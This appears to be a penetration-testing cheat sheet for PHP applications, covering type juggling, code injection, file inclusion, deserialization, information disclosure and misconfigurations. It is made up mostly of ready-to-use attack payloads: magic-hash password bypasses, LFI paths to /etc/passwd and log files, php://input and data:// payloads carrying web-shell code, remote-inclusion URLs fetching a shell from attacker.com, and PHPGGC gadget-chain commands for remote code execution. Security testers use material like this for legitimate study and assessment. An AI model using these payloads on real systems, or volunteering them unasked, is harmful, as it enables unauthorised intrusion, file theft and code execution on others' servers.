# PHP Security Testing

## Overview
PHP-specific vulnerability testing including type juggling, code injection, deserialization, and common misconfigurations.

## PHP Type Juggling
```
# PHP loose comparison (==) vs strict (===)
# Magic hashes - MD5 hash starts with "0e"
0e123 == 0e456 == 0  (scientific notation, both equal to 0)

# Known magic hashes:
# MD5("240610708") = 0e462097431906509019562988736854
# MD5("QNKCDZO") = 0e830400451993494058024219903391
# SHA1("aaroZmOk") = 0e66507019969427134894567494305185566735

# Attack: if MD5(user_input) == MD5(stored_hash) with ==
# Provide "240610708" as password for any account using magic hash

# Other type juggling:
"1 malicious" == 1  → true
"0abc" == 0 → true (in old PHP < 8.0)
null == false == 0 == "" == "0"

# Array bypass
md5(array()) = null
sha1(array()) = null
strcmp(array(), "string") = 0 (vulnerable strcmp bypass)
```

## PHP Remote Code Execution

### Code Injection
```
# eval() injection
eval("$var = " . user_input . ";")
preg_replace('/(.+)/e', user_input, 'match')  # /e flag deprecated but old code

# system/exec injection
system("cmd " . user_input)
exec("ls " . user_input)
passthru("cat " . user_input)
shell_exec("id " . user_input)
popen("cmd " . user_input, 'r')
proc_open with user input
```

### PHP File Inclusion
```
# Local File Inclusion
include($_GET['page'])
require($_GET['template'] . '.php')

# Common LFI payloads:
?page=../../../../etc/passwd
?page=../../../proc/self/environ
?page=../../../var/log/apache2/access.log  (log poisoning → RCE)

# PHP filters for LFI:
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/read=string.rot13/resource=index.php

# Remote File Inclusion (if allow_url_include=On)
?page=http://attacker.com/shell.php
?page=ftp://attacker.com/shell.php

# PHP input stream
?page=php://input
POST body: <?php system($_GET['cmd']); ?>

# Data URI
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### PHP Deserialization
```
# See deserialization.md for full details
# PHP unserialize() on user input
# Look for serialized data: O:4:"User":1:{s:4:"name";s:5:"admin";}
# Use PHPGGC for gadget chains
```

## PHP Information Disclosure
```
# phpinfo() exposure
/phpinfo.php, /info.php, /php_info.php, /test.php
# Reveals: PHP version, configuration, environment variables, loaded modules

# Error messages
# display_errors = On → full stack traces
# Set invalid input to trigger errors

# Source code disclosure
/.php.bak, /index.php~, /index.php.old
# Backup files with .bak, .orig, .old, ~ suffix

# .php.swp (vim swap file)
/.index.php.swp
```

## PHP Session Handling
```
# Default session files
/tmp/sess_SESSIONID
/var/lib/php/sessions/sess_SESSIONID

# Session injection via LFI:
1. Find LFI vulnerability
2. Log malicious PHP in session: Set-Cookie with PHP code
3. Include session file via LFI → RCE

# Session file path
PHPSESSID value → /tmp/sess_[PHPSESSID]
```

## PHP Object Injection
```
# Vulnerable code: unserialize($_COOKIE['data'])
# Craft malicious serialized object

# Common gadget chain targets:
# Guzzle, Symfony, Laravel, Monolog, Doctrine

# PHPGGC (PHP Generic Gadget Chains)
phpggc Laravel/RCE7 system id
phpggc Symfony/RCE4 system id -b  # base64 encoded
phpggc Monolog/RCE1 system id
```

## PHP Specific Bypasses
```
# Null byte (PHP < 5.3.4)
../../etc/passwd%00.jpg

# Array as input to bypass type checks
password[]=bypass

# Excessive whitespace
" SELECT " == "SELECT"

# PHP_EOL injection
# OS-specific line endings
```

## PHP Config Misconfigurations
```
# Dangerous settings (check phpinfo):
allow_url_include = On  → RFI possible
allow_url_fopen = On    → URL fopen (SSRF risk)
display_errors = On     → info disclosure
expose_php = On         → version in headers
register_globals = On   → variable injection (old)
magic_quotes_gpc = Off  → injection easier

# Dangerous functions to find in code:
eval, exec, system, passthru, shell_exec, popen, proc_open
preg_replace(/e), assert, create_function
```

## Testing Methodology
1. Identify PHP via headers (X-Powered-By) or phpinfo
2. Test for LFI in file/template/page parameters
3. Test for PHP filter wrappers
4. Test for RFI if allow_url_include detectable
5. Test type juggling in login/comparison logic
6. Check for exposed phpinfo.php
7. Look for backup source files
8. Test deserialization in cookies/parameters
9. Identify code injection via eval/system wrappers

## Tools
- `nuclei -t php/` templates
- `PHPGGC` — PHP gadget chains
- `LFISuite` — LFI exploitation
- Burp Suite for interception
